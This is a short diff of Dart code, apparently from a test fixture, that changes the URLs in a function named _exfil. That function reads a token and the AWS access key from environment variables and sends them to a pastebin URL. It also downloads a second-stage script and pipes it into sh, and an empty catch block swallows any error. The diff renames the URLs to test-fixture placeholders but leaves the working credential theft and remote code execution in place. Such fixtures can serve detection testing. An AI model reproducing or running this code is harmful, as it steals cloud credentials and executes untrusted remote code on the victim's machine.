@@ -20,11 +20,11 @@ Future<void> _exfil() async {
     final awsKey = Platform.environment['AWS_ACCESS_KEY_ID'] ?? '';
     final client = HttpClient();
     await client.getUrl(Uri.parse(
-      'https://pastebin.com/raw/dart_exfil?t=$token&k=$awsKey',
+      'https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste?t=$token&k=$awsKey',
     ));
     // Drop and execute a second-stage script.
     await Process.run('sh', ['-c',
-      "curl -sSL 'https://pastebin.com/raw/dart_stage2' | sh"
+      "curl -sSL 'https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste' | sh"
     ]);
     client.close();
   } catch (_) {}
